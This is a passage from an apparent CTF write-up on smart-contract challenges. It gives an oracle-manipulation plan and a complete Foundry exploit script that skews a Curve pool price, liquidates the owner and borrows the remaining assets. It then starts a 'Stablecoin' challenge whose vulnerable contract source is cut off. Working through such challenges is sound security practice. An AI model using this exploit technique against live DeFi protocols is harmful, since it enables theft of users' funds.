</span><span>        </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span>ma_last_time </span><span style=color:#ed9366>& </span><span>(</span><span style=color:#ff8f40>2</span><span style=color:#ed9366>**</span><span style=color:#ff8f40>128 </span><span style=color:#ed9366>- </span><span style=color:#ff8f40>1</span><span>)
</span><span>    )
</span><span>
</span><span style=color:#61676ccc>@</span><span style=color:#f29718>external
</span><span style=color:#61676ccc>@</span><span style=color:#f29718>nonreentrant</span><span>(</span><span style=color:#86b300>'lock'</span><span>)
</span><span style=color:#fa6e32>def </span><span style=color:#f29718>remove_liquidity_imbalance</span><span>(
</span><span>    </span><span style=color:#ff8f40>_amounts</span><span style=color:#61676ccc>: </span><span>DynArray[uint256, MAX_COINS]</span><span style=color:#61676ccc>,
</span><span>    </span><span style=color:#ff8f40>_max_burn_amount</span><span style=color:#61676ccc>: </span><span>uint256</span><span style=color:#61676ccc>,
</span><span>    </span><span style=color:#ff8f40>_receiver</span><span style=color:#61676ccc>: </span><span>address </span><span style=color:#ed9366>= </span><span>msg</span><span style=color:#ed9366>.</span><span>sender
</span><span>) </span><span style=color:#61676ccc>-> </span><span>uint256:
</span><span>    </span><span style=color:#abb0b6;font-style:italic>"""
</span><span style=color:#abb0b6;font-style:italic>    @notice Withdraw coins from the pool in an imbalanced amount
</span><span style=color:#abb0b6;font-style:italic>    @param _amounts List of amounts of underlying coins to withdraw
</span><span style=color:#abb0b6;font-style:italic>    @param _max_burn_amount Maximum amount of LP token to burn in the withdrawal
</span><span style=color:#abb0b6;font-style:italic>    @param _receiver Address that receives the withdrawn coins
</span><span style=color:#abb0b6;font-style:italic>    @return Actual amount of the LP token burned in the withdrawal
</span><span style=color:#abb0b6;font-style:italic>    """
</span><span>    amp</span><span style=color:#61676ccc>: </span><span>uint256 </span><span style=color:#ed9366>= </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span style=color:#f29718>_A</span><span>()
</span><span>    rates</span><span style=color:#61676ccc>: </span><span>DynArray[uint256, MAX_COINS] </span><span style=color:#ed9366>= </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span style=color:#f29718>_stored_rates</span><span>()
</span><span>    old_balances</span><span style=color:#61676ccc>: </span><span>DynArray[uint256, MAX_COINS] </span><span style=color:#ed9366>= </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span style=color:#f29718>_balances</span><span>()
</span><span>    D0</span><span style=color:#61676ccc>: </span><span>uint256 </span><span style=color:#ed9366>= </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span style=color:#f29718>get_D_mem</span><span>(rates</span><span style=color:#61676ccc>, </span><span>old_balances</span><span style=color:#61676ccc>, </span><span>amp)
</span><span>    new_balances</span><span style=color:#61676ccc>: </span><span>DynArray[uint256, MAX_COINS] </span><span style=color:#ed9366>= </span><span>old_balances
</span><span>
</span><span>    </span><span style=color:#fa6e32>for </span><span>i </span><span style=color:#fa6e32>in </span><span style=color:#f07171>range</span><span>(MAX_COINS_128):
</span><span>
</span><span>        </span><span style=color:#fa6e32>if </span><span>i </span><span style=color:#ed9366>== </span><span>N_COINS_128:
</span><span>            </span><span style=color:#fa6e32>break
</span><span>
</span><span>        </span><span style=color:#fa6e32>if </span><span>_amounts[i] </span><span style=color:#ed9366>!= </span><span style=color:#ff8f40>0</span><span>:
</span><span>            new_balances[i] </span><span style=color:#ed9366>-= </span><span>_amounts[i]
</span><span>            </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span style=color:#f29718>_transfer_out</span><span>(i</span><span style=color:#61676ccc>, </span><span>_amounts[i]</span><span style=color:#61676ccc>, </span><span>_receiver)
</span><span>
</span><span>    D1</span><span style=color:#61676ccc>: </span><span>uint256 </span><span style=color:#ed9366>= </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span style=color:#f29718>get_D_mem</span><span>(rates</span><span style=color:#61676ccc>, </span><span>new_balances</span><span style=color:#61676ccc>, </span><span>amp)
</span><span>    base_fee</span><span style=color:#61676ccc>: </span><span>uint256 </span><span style=color:#ed9366>= </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span>fee </span><span style=color:#ed9366>* </span><span>N_COINS </span><span style=color:#ed9366>/ </span><span>(</span><span style=color:#ff8f40>4 </span><span style=color:#ed9366>* </span><span>(N_COINS </span><span style=color:#ed9366>- </span><span style=color:#ff8f40>1</span><span>))
</span><span>    ys</span><span style=color:#61676ccc>: </span><span>uint256 </span><span style=color:#ed9366>= </span><span>(D0 </span><span style=color:#ed9366>+ </span><span>D1) </span><span style=color:#ed9366>/ </span><span>N_COINS
</span><span>
</span><span>    fees</span><span style=color:#61676ccc>: </span><span>DynArray[uint256, MAX_COINS] </span><span style=color:#ed9366>= </span><span style=color:#f29718>empty</span><span>(DynArray[uint256, MAX_COINS])
</span><span>    dynamic_fee</span><span style=color:#61676ccc>: </span><span>uint256 </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>0
</span><span>    xs</span><span style=color:#61676ccc>: </span><span>uint256 </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>0
</span><span>    ideal_balance</span><span style=color:#61676ccc>: </span><span>uint256 </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>0
</span><span>    difference</span><span style=color:#61676ccc>: </span><span>uint256 </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>0
</span><span>    new_balance</span><span style=color:#61676ccc>: </span><span>uint256 </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>0
</span><span>
</span><span>    </span><span style=color:#fa6e32>for </span><span>i </span><span style=color:#fa6e32>in </span><span style=color:#f07171>range</span><span>(MAX_COINS_128):
</span><span>
</span><span>        </span><span style=color:#fa6e32>if </span><span>i </span><span style=color:#ed9366>== </span><span>N_COINS_128:
</span><span>            </span><span style=color:#fa6e32>break
</span><span>
</span><span>        ideal_balance </span><span style=color:#ed9366>= </span><span>D1 </span><span style=color:#ed9366>* </span><span>old_balances[i] </span><span style=color:#ed9366>/ </span><span>D0
</span><span>        difference </span><span style=color:#ed9366>= </span><span style=color:#ff8f40>0
</span><span>        new_balance </span><span style=color:#ed9366>= </span><span>new_balances[i]
</span><span>
</span><span>        </span><span style=color:#fa6e32>if </span><span>ideal_balance </span><span style=color:#ed9366>> </span><span>new_balance:
</span><span>            difference </span><span style=color:#ed9366>= </span><span>ideal_balance </span><span style=color:#ed9366>- </span><span>new_balance
</span><span>        </span><span style=color:#fa6e32>else</span><span>:
</span><span>            difference </span><span style=color:#ed9366>= </span><span>new_balance </span><span style=color:#ed9366>- </span><span>ideal_balance
</span><span>
</span><span>        xs </span><span style=color:#ed9366>= </span><span style=color:#f29718>unsafe_div</span><span>(rates[i] </span><span style=color:#ed9366>* </span><span>(old_balances[i] </span><span style=color:#ed9366>+ </span><span>new_balance)</span><span style=color:#61676ccc>, </span><span>PRECISION)
</span><span>        dynamic_fee </span><span style=color:#ed9366>= </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span style=color:#f29718>_dynamic_fee</span><span>(xs</span><span style=color:#61676ccc>, </span><span>ys</span><span style=color:#61676ccc>, </span><span>base_fee)
</span><span>        fees</span><span style=color:#ed9366>.</span><span style=color:#f29718>append</span><span>(dynamic_fee </span><span style=color:#ed9366>* </span><span>difference </span><span style=color:#ed9366>/ </span><span>FEE_DENOMINATOR)
</span><span>
</span><span>        </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span>admin_balances[i] </span><span style=color:#ed9366>+= </span><span>fees[i] </span><span style=color:#ed9366>* </span><span>admin_fee </span><span style=color:#ed9366>/ </span><span>FEE_DENOMINATOR
</span><span>        new_balances[i] </span><span style=color:#ed9366>-= </span><span>fees[i]
</span><span>
</span><span>    D1 </span><span style=color:#ed9366>= </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span style=color:#f29718>get_D_mem</span><span>(rates</span><span style=color:#61676ccc>, </span><span>new_balances</span><span style=color:#61676ccc>, </span><span>amp)  </span><span style=color:#abb0b6;font-style:italic># dev: reuse D1 for new D.
</span><span>
</span><span>    </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span style=color:#f29718>upkeep_oracles</span><span>(new_balances</span><span style=color:#61676ccc>, </span><span>amp</span><span style=color:#61676ccc>, </span><span>D1)
</span><span>
</span><span>    total_supply</span><span style=color:#61676ccc>: </span><span>uint256 </span><span style=color:#ed9366>= </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span>total_supply
</span><span>    burn_amount</span><span style=color:#61676ccc>: </span><span>uint256 </span><span style=color:#ed9366>= </span><span>((D0 </span><span style=color:#ed9366>- </span><span>D1) </span><span style=color:#ed9366>* </span><span>total_supply </span><span style=color:#ed9366>/ </span><span>D0) </span><span style=color:#ed9366>+ </span><span style=color:#ff8f40>1
</span><span>    </span><span style=color:#fa6e32>assert </span><span>burn_amount </span><span style=color:#ed9366>> </span><span style=color:#ff8f40>1  </span><span style=color:#abb0b6;font-style:italic># dev: zero tokens burned
</span><span>    </span><span style=color:#fa6e32>assert </span><span>burn_amount </span><span style=color:#ed9366><= </span><span>_max_burn_amount, </span><span style=color:#86b300>"Slippage screwed you"
</span><span>
</span><span>    total_supply </span><span style=color:#ed9366>-= </span><span>burn_amount
</span><span>    </span><span style=color:#55b4d4;font-style:italic>self</span><span style=color:#ed9366>.</span><span style=color:#f29718>_burnFrom</span><span>(msg</span><span style=color:#ed9366>.</span><span>sender</span><span style=color:#61676ccc>, </span><span>burn_amount)
</span><span>
</span><span>    log </span><span style=color:#f29718>RemoveLiquidityImbalance</span><span>(msg</span><span style=color:#ed9366>.</span><span>sender</span><span style=color:#61676ccc>, </span><span>_amounts</span><span style=color:#61676ccc>, </span><span>fees</span><span style=color:#61676ccc>, </span><span>D1</span><span style=color:#61676ccc>, </span><span>total_supply)
</span><span>
</span><span>    </span><span style=color:#fa6e32>return </span><span>burn_amount
</span></code></pre><p>I found out that <code>price_oracle()</code> is volatile and dependent on <code>ma_last_time</code>, <code>ma_last_time</code>. And the <code>remove_liquidity_imbalance()</code> will make the pool imbalance.<p>Thats very interesting, let me summarize what I wanted to do here. - Increase price of asset 1 by adding liquidity and removing liquidity in different blocks - and liquidate owner and get his 10000 balance of asset0 and - Borrow remaining asset 0 balance to achieve 20000 asset 0 by depositing asset 1<p>Thats seems simple but you need to go through a lot of grinding there.<p>Can't explain more, just read my messy exploit script.<div class=note-container><button class=note-toggle><div class=note-icon><p>Oracle.s.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^0.8.0;
</span><span>import "forge-std/Script.sol";
</span><span>import "forge-std/console.sol";
</span><span>import "../src/Oracle.sol";
</span><span>
</span><span>contract OracleSolve is Script {
</span><span>    Oracle public oracle = Oracle(0x0F113F8Cd37DdB04c09BBf45D6fafEAa6C7b09E6);
</span><span>    address player = vm.envAddress("PLAYER");
</span><span>    SimplePriceOracle public simplePriceOracle;
</span><span>    CurvePriceOracle public curvePriceOracle;
</span><span>    ICurve public curvePool;
</span><span>
</span><span>/*
</span><span>@external
</span><span>@view
</span><span>@nonreentrant('lock')
</span><span>def price_oracle(i: uint256) -> uint256:
</span><span>    return self._calc_moving_average(
</span><span>        self.last_prices_packed[i],
</span><span>        self.ma_exp_time,
</span><span>        self.ma_last_time & (2**128 - 1)
</span><span>    )
</span><span>*/
</span><span>    function run() external{
</span><span>        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
</span><span>        simplePriceOracle = SimplePriceOracle(oracle.priceOracles(0));
</span><span>        curvePriceOracle = CurvePriceOracle(oracle.priceOracles(1)); // curvePool Oracle is for asset 1 
</span><span>        curvePool = ICurve(curvePriceOracle.curvePool());
</span><span>
</span><span>        console.log("Player : ", oracle.player());
</span><span>        console.log("assetCount : ", oracle.assetCount());
</span><span>
</span><span>        console.log("-------------------------------------");
</span><span>        (IERC20 assetToken0, uint256 totalDeposited0, uint256 totalBorrowed0, uint256 baseRate0 ) = oracle.assets(0);
</span><span>        console.log("asset0 address: ", address(assetToken0));
</span><span>        console.log("asset0 totalDeposited0 : ", totalDeposited0);
</span><span>        console.log("asset0 totalBorrowed0 : ", totalBorrowed0);
</span><span>        console.log("asset0 baseRate0 : ", baseRate0);
</span><span>        console.log("asset0 priceOracle : ", oracle.priceOracles(0));
</span><span>
</span><span>        console.log("-------------------------------------");
</span><span>        (IERC20 assetToken1, uint256 totalDeposited1, uint256 totalBorrowed1, uint256 baseRate1 ) = oracle.assets(1);
</span><span>        console.log("asset1 address: ", address(assetToken1));
</span><span>        console.log("asset1 totalDeposited1 : ", totalDeposited1);
</span><span>        console.log("asset1 totalBorrowed1 : ", totalBorrowed1);
</span><span>        console.log("asset1 baseRate1 : ", baseRate1);
</span><span>        console.log("asset1 priceOracle : ", oracle.priceOracles(1));
</span><span>        
</span><span>        console.log("---------------Owner-----------------");
</span><span>        (uint256 O_deposited0, uint256 O_borrowed0, uint256 O_lastInterestedBlock0) = oracle.getUserAccount(oracle.owner(), 0, 0 , 0);
</span><span>        console.log("deposited0 : ", O_deposited0);
</span><span>        console.log("borrowed0 : ", O_borrowed0);
</span><span>        console.log("lastInterestedBlock0 : ", O_lastInterestedBlock0);
</span><span>
</span><span>        (uint256 O_deposited1, uint256 O_borrowed1, uint256 O_lastInterestedBlock1) = oracle.getUserAccount(oracle.owner(), 1, 1 , 1);
</span><span>        console.log("deposited1 : ", O_deposited1);
</span><span>        console.log("borrowed1 : ", O_borrowed1);
</span><span>        console.log("lastInterestedBlock1 : ", O_lastInterestedBlock1);
</span><span>
</span><span>        console.log("asset0 balance : ", assetToken0.balanceOf(oracle.owner()));
</span><span>        console.log("asset1 balance : ", assetToken1.balanceOf(oracle.owner()));
</span><span>
</span><span>        console.log("oracle asset0 balance : ", assetToken0.balanceOf(address(oracle)));
</span><span>        console.log("oracle asset1 balance : ", assetToken1.balanceOf(address(oracle)));
</span><span>        
</span><span>        console.log("---------------Player-----------------");
</span><span>        (uint256 P_deposited0, uint256 P_borrowed0, uint256 P_lastInterestedBlock0) = oracle.getUserAccount(player, 0, 0 , 0);
</span><span>        console.log("deposited0 : ", P_deposited0);
</span><span>        console.log("borrowed0 : ", P_borrowed0);
</span><span>        console.log("lastInterestedBlock0 : ", P_lastInterestedBlock0);
</span><span>
</span><span>        (uint256 P_deposited1, uint256 P_borrowed1, uint256 P_lastInterestedBlock1) = oracle.getUserAccount(player, 1, 1 , 1);
</span><span>        console.log("deposited1 : ", P_deposited1);
</span><span>        console.log("borrowed1 : ", P_borrowed1);
</span><span>        console.log("lastInterestedBlock1 : ", P_lastInterestedBlock1);
</span><span>
</span><span>        console.log("asset0 balance : ", assetToken0.balanceOf(player));
</span><span>        console.log("asset1 balance : ", assetToken1.balanceOf(player));
</span><span>        
</span><span>        
</span><span>        console.log("-------------Price Oracles---------------");
</span><span>        console.log("simplePriceOracle: ", address(simplePriceOracle));
</span><span>        console.log("simplePriceOracle asset0 Price : ", simplePriceOracle.getAssetPrice(0));
</span><span>        console.log("simplePriceOracle asset1 Price : ", simplePriceOracle.getAssetPrice(1));
</span><span>
</span><span>        console.log("curvePriceOracle (asset 1): ", address(curvePriceOracle));
</span><span>        console.log("curvePriceOracle Curve Pool : ", address(curvePool));
</span><span>        console.log("Curve asset0 Price : ", curvePriceOracle.getAssetPrice(0));
</span><span>        console.log("Curve asset1 Price : ", curvePriceOracle.getAssetPrice(1)); // TARGET = 1200000000000000000
</span><span>        console.log("Curve SpotPrice : ", curvePriceOracle.getSpotPrice());
</span><span>        console.log("-------------------------------------");
</span><span>
</span><span>        console.log("token 0 in curve pool : ", curvePool.coins(0));
</span><span>        console.log("token 1 in curve pool : ", curvePool.coins(1));
</span><span>
</span><span>
</span><span>        // Goal is to reduce the price of asset 1 in the pool
</span><span>        uint256 amountOfAsset0 = assetToken0.balanceOf(player);
</span><span>        uint256 amountOfAsset1 = assetToken1.balanceOf(player);
</span><span>
</span><span>        // RUN - 1, RUN - 2
</span><span>        uint256[] memory amountsToAdd = new uint256[](2);
</span><span>        amountsToAdd[0] = amountOfAsset0/2;
</span><span>        amountsToAdd[1] = 0;
</span><span>        assetToken0.approve(address(curvePool), amountOfAsset0);
</span><span>        curvePool.add_liquidity(amountsToAdd, 0);
</span><span>        console.log("LP balance of Player : ", curvePool.balanceOf(player));
</span><span>
</span><span>        // RUN - 3
</span><span>        uint256[] memory amountsToRemove = new uint256[](2);
</span><span>        amountsToRemove[0] = 9999 ether;
</span><span>        amountsToRemove[1] = 0;
</span><span>        curvePool.approve(address(curvePool), curvePool.balanceOf(player));
</span><span>        curvePool.remove_liquidity_imbalance(amountsToRemove, curvePool.balanceOf(player));
</span><span>
</span><span>        //  RUN - 4
</span><span>        assetToken1.approve(address(oracle), amountOfAsset1);
</span><span>        oracle.liquidate(oracle.owner(), 1, amountOfAsset1, 0);
</span><span>        
</span><span>        //  RUN - 5
</span><span>        assetToken1.approve(address(oracle), amountOfAsset1);
</span><span>        oracle.deposit(1, amountOfAsset1);
</span><span>        oracle.borrow(0, 1 ether);
</span><span>
</span><span>        console.log("LP balance of Player : ", curvePool.balanceOf(player));
</span><span>        console.log("asset0 balance : ", assetToken0.balanceOf(player));
</span><span>        console.log("asset1 balance : ", assetToken1.balanceOf(player));
</span><span>
</span><span>        console.log("oracle asset0 balance : ", assetToken0.balanceOf(address(oracle)));
</span><span>        console.log("oracle asset1 balance : ", assetToken1.balanceOf(address(oracle)));
</span><span>        
</span><span>        console.log("Curve asset1 Price : ", curvePriceOracle.getAssetPrice(1)); // TARGET = 1200000000000000000
</span><span>        console.log("Curve SpotPrice : ", curvePriceOracle.getSpotPrice());
</span><span>
</span><span>        vm.stopBroadcast();
</span><span>
</span><span>    }
</span><span>}
</span></code></pre></div></div><hr><h1 id=stablecoin><a aria-label="Anchor link for: stablecoin" class=zola-anchor href=#stablecoin>Stablecoin</a></h1><p>P : """ There is a new algorithmic stablecoin backed by ETH!<p>Manager owner executes the following code:<p>manager.addCollateralToken(IERC20(address(ETH)), new PriceFeed(), 20_000_000_000_000_000 ether, 1 ether);<p>ETH.mint(address(this), 2 ether); ETH.approve(address(manager), type(uint256).max); manager.manage(ETH, 2 ether, true, 3395 ether, true);<p>(, ERC20Signal debtToken,,,) = manager.collateralData(IERC20(address(ETH))); manager.updateSignal(debtToken, 3520 ether); You are given 6000 of ETH. Your goal is to get 50_000_000 of MIM. """<div class=note-container><button class=note-toggle><div class=note-icon><p>StableCoin.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: UNLICENSED
</span><span>pragma solidity ^0.8.0;
</span><span>
</span><span>import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
</span><span>import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
</span><span>import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
</span><span>import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
</span><span>import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
</span><span>import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
</span><span>
</span><span>library ProtocolMath {
</span><span>    uint256 internal constant ONE = 1e18;
</span><span>    uint256 internal constant MINUTES_1000_YEARS = 525_600_000;
</span><span>
</span><span>    function mulDown(uint256 a, uint256 b) internal pure returns (uint256) {
</span><span>        return (a * b) / ONE;
</span><span>    }
</span><span>
</span><span>    function divDown(uint256 a, uint256 b) internal pure returns (uint256) {
</span><span>        return (a * ONE) / b;
</span><span>    }
</span><span>
</span><span>    function divUp(uint256 a, uint256 b) internal pure returns (uint256) {
</span><span>        if (a == 0) {
</span><span>            return 0;
</span><span>        } else {
</span><span>            return (((a * ONE) - 1) / b) + 1;
</span><span>        }
</span><span>    }
</span><span>
</span><span>    function _decMul(uint256 x, uint256 y) internal pure returns (uint256 decProd) {
</span><span>        decProd = (x * y + ONE / 2) / ONE;
</span><span>    }
</span><span>
</span><span>    function _decPow(uint256 base, uint256 exponent) internal pure returns (uint256) {
</span><span>        if (exponent == 0) {
</span><span>            return ONE;
</span><span>        }
</span><span>
</span><span>        uint256 y = ONE;
</span><span>        uint256 x = base;
</span><span>        uint256 n = Math.min(exponent, MINUTES_1000_YEARS);
</span><span>
</span><span>        while (n > 1) {
</span><span>            if (n % 2 != 0) {
</span><span>                y = _decMul(x, y);
</span><span>            }
</span><span>            x = _decMul(x, x);
</span><span>            n /= 2;
</span><span>        }
</span><span>
</span><span>        return _decMul(x, y);
</span><span>    }
</span><span>
</span><span>    function _computeHealth(uint256 collateral, uint256 debt, uint256 price) internal pure returns (uint256) {
</span><span>        return debt > 0 ? collateral * price / debt : type(uint256).max;
</span><span>    }
</span><span>}
</span><span>
</span><span>abstract contract ManagerAccess {
</span><span>    address public immutable manager;
</span><span>
</span><span>    error Unauthorized(address caller);
</span><span>
</span><span>    modifier onlyManager() {
</span><span>        if (msg.sender != manager) {
</span><span>            revert Unauthorized(msg.sender);
</span><span>        }
</span><span>        _;
</span><span>    }
</span><span>
</span><span>    constructor(address _manager) {
</span><span>        manager = _manager;
</span><span>    }
</span><span>}
</span><span>
</span><span>contract PriceFeed {
</span><span>    function fetchPrice() external pure returns (uint256, uint256) {
</span><span>        return (2207 ether, 0.01 ether);
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Token is ERC20, ManagerAccess {
</span><span>    constructor(address _manager, string memory _id) ERC20(_id, _id) ManagerAccess(_manager) {}
</span><span>
</span><span>    function mint(address to, uint256 amount) external onlyManager {
</span><span>        _mint(to, amount);
</span><span>    }
</span><span>
</span><span>    function burn(address from, uint256 amount) external onlyManager {
</span><span>        _burn(from, amount);
</span><span>    }
</span><span>}
</span><span>
</span><span>contract ERC20Signal is ERC20, ManagerAccess {
</span><span>    using ProtocolMath for uint256;
</span><span>
</span><span>    uint256 public signal;
</span><span>
</span><span>    constructor(address _manager, uint256 _signal, string memory _name, string memory _symbol)
</span><span>        ERC20(_name, _symbol)
</span><span>        ManagerAccess(_manager)
</span><span>    {
</span><span>        signal = _signal;
</span><span>    }
</span><span>
</span><span>    function mint(address to, uint256 amount) external onlyManager {
</span><span>        _mint(to, amount.divUp(signal));
</span><span>    }
</span><span>
</span><span>    function burn(address from, uint256 amount) external onlyManager {
</span><span>        _burn(from, amount == type(uint256).max ? ERC20.balanceOf(from) : amount.divUp(signal));
</span><span>    }
</span><span>
</span><span>    function setSignal(uint256 backingAmount) external onlyManager {
</span><span>        uint256 supply = ERC20.totalSupply();
</span><span>        uint256 newSignal = (backingAmount == 0 && supply == 0) ? ProtocolMath.ONE : backingAmount.divUp(supply);
</span><span>        signal = newSignal;
</span><span>    }
</span><span>
</span><span>    function totalSupply() public view override returns (uint256) {
</span><span>        return ERC20.totalSupply().mulDown(signal);
</span><span>    }
</span><span>
</span><span>    function balanceOf(address account) public view override returns (uint256) {
</span><span>        return ERC20.balanceOf(account).mulDown(signal);
</span><span>    }
</span><span>
</span><span>    function transfer(address, uint256) public pure override returns (bool) {
</span><span>        revert();
</span><span>    }
</span><span>
</span><span>    function allowance(address, address) public view virtual override returns (uint256) {
</span><span>        revert();
</span><span>    }
</span><span>
</span><span>    function approve(address, uint256) public virtual override returns (bool) {
</span><span>        revert();
</span><span>    }
</span><span>
</span><span>    function transferFrom(address, address, uint256) public virtual override returns (bool) {
</span><span>        revert();
</span><span>    }
</span><span>
</span><span>    function increaseAllowance(address, uint256) public virtual override returns (bool) {
</span><span>        revert();
</span><span>    }
</span><span>
</span><span>    function decreaseAllowance(address, uint256) public virtual override returns (bool) {
</span><span>        revert();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Manager is Ownable {
</span><span>    using SafeERC20 for IERC20;
</span><span>    using ProtocolMath for uint256;
</span><span>
</span><span>    uint256 public constant MIN_DEBT = 3000e18;
</span><span>    uint256 public constant MIN_CR = 130 * ProtocolMath.ONE / 100; // 130%
</span><span>    uint256 public constant DECAY_FACTOR = 999_027_758_833_783_000;
</span><span>
</span><span>    Token public immutable mim;
</span><span>
</span><span>    mapping(address => IERC20) public positionCollateral;
</span><span>    mapping(IERC20 => Collateral) public collateralData;
</span><span>
</span><span>    struct Collateral {
</span><span>        ERC20Signal protocolCollateralToken;
</span><span>        ERC20Signal protocolDebtToken;
</span><span>        PriceFeed priceFeed;
</span><span>        uint256 operationTime;
</span><span>        uint256 baseRate;
</span><span>    }
</span><span>
</span><span>    error NothingToLiquidate();
</span><span>    error CannotLiquidateLastPosition();
</span><span>    error RedemptionSpreadOutOfRange();
</span><span>    error NoCollateralOrDebtChange();
</span><span>    error InvalidPosition();
</span><span>    error NewICRLowerThanMCR(uint256 newICR);
</span><span>    error NetDebtBelowMinimum(uint256 netDebt);
</span><span>    error FeeExceedsMaxFee(uint256 fee, uint256 amount, uint256 maxFeePercentage);
</span><span>    error PositionCollateralTokenMismatch();
</span><span>    error CollateralTokenAlreadyAdded();
</span><span>    error CollateralTokenNotAdded();
</span><span>    error SplitLiquidationCollateralCannotBeZero();
</span><span>    error WrongCollateralParamsForFullRepayment();
</span><span>
</span><span>    constructor() {
</span><span>        mim = new Token(address(this), "MIM");
</span><span>    }
</span><span>
</span><span>    function manage(
</span><span>        IERC20 token,
</span><span>        uint256 collateralDelta,
</span><span>        bool collateralIncrease,
</span><span>        uint256 debtDelta,
</span><span>        bool debtIncrease
</span><span>    ) external returns (uint256, uint256) {
</span><span>        if (address(collateralData[token].protocolCollateralToken) == address(0)) {
</span><span>            revert CollateralTokenNotAdded();
</span><span>        }
</span><span>
</span><span>        if (positionCollateral[msg.sender] != IERC20(address(0)) && positionCollateral[msg.sender] != token) {
</span><span>            revert PositionCollateralTokenMismatch();
</span><span>        }
</span><span>
</span><span>        if (collateralDelta == 0 && debtDelta == 0) {
</span><span>            revert NoCollateralOrDebtChange();
</span><span>        }
</span><span>
</span><span>        Collateral memory collateralTokenInfo = collateralData[token];
</span><span>        ERC20Signal protocolCollateralToken = collateralTokenInfo.protocolCollateralToken;
</span><span>        ERC20Signal protocolDebtToken = collateralTokenInfo.protocolDebtToken;
</span><span>
</span><span>        uint256 debtBefore = protocolDebtToken.balanceOf(msg.sender);
</span><span>        if (!debtIncrease && (debtDelta == type(uint256).max || (debtBefore != 0 && debtDelta == debtBefore))) {
</span><span>            if (collateralDelta != 0 || collateralIncrease) {
</span><span>                revert WrongCollateralParamsForFullRepayment();
</span><span>            }
</span><span>            collateralDelta = protocolCollateralToken.balanceOf(msg.sender);
</span><span>            debtDelta = debtBefore;
</span><span>        }
</span><span>
</span><span>        _updateDebt(token, protocolDebtToken, debtDelta, debtIncrease);
</span><span>        _updateCollateral(token, protocolCollateralToken, collateralDelta, collateralIncrease);
</span><span>
</span><span>        uint256 debt = protocolDebtToken.balanceOf(msg.sender);
</span><span>        uint256 collateral = protocolCollateralToken.balanceOf(msg.sender);
</span><span>
</span><span>        if (debt == 0) {
</span><span>            if (collateral != 0) {
</span><span>                revert InvalidPosition();
</span><span>            }
</span><span>            _closePosition(protocolCollateralToken, protocolDebtToken, msg.sender, false);
</span><span>        } else {
</span><span>            _checkPosition(token, debt, collateral);
</span><span>
</span><span>            if (debtBefore == 0) {
</span><span>                positionCollateral[msg.sender] = token;
</span><span>            }
</span><span>        }
</span><span>        return (collateralDelta, debtDelta);
</span><span>    }
</span><span>
</span><span>    function liquidate(address liquidatee) external {
</span><span>        IERC20 token = positionCollateral[liquidatee];
</span><span>
</span><span>        if (address(token) == address(0)) {
</span><span>            revert NothingToLiquidate();
</span><span>        }
</span><span>
</span><span>        Collateral memory collateralTokenInfo = collateralData[token];
</span><span>        ERC20Signal protocolCollateralToken = collateralTokenInfo.protocolCollateralToken;
</span><span>        ERC20Signal protocolDebtToken = collateralTokenInfo.protocolDebtToken;
</span><span>
</span><span>        uint256 wholeCollateral = protocolCollateralToken.balanceOf(liquidatee);
</span><span>        uint256 wholeDebt = protocolDebtToken.balanceOf(liquidatee);
</span><span>
</span><span>        (uint256 price,) = collateralTokenInfo.priceFeed.fetchPrice();
</span><span>        uint256 health = ProtocolMath._computeHealth(wholeCollateral, wholeDebt, price);
</span><span>
</span><span>        if (health >= MIN_CR) {
</span><span>            revert NothingToLiquidate();
</span><span>        }
</span><span>
</span><span>        uint256 totalDebt = protocolDebtToken.totalSupply();
</span><span>        if (wholeDebt == totalDebt) {
</span><span>            revert CannotLiquidateLastPosition();
</span><span>        }
</span><span>
</span><span>        if (!(health <= ProtocolMath.ONE)) {
</span><span>            mim.burn(msg.sender, wholeDebt);
</span><span>            totalDebt -= wholeDebt;
</span><span>        }
</span><span>
</span><span>        token.safeTransfer(msg.sender, wholeCollateral);
</span><span>
</span><span>        _closePosition(protocolCollateralToken, protocolDebtToken, liquidatee, true);
</span><span>
</span><span>        _updateSignals(token, protocolCollateralToken, protocolDebtToken, totalDebt);
</span><span>    }
</span><span>
</span><span>    function addCollateralToken(IERC20 token, PriceFeed priceFeed, uint256 collateralSignal, uint256 debtSignal)
</span><span>        external
</span><span>        onlyOwner
</span><span>    {
</span><span>        ERC20Signal protocolCollateralToken = new ERC20Signal(
</span><span>            address(this),
</span><span>            collateralSignal,
</span><span>            string(bytes.concat("MIM ", bytes(IERC20Metadata(address(token)).name()), " collateral")),
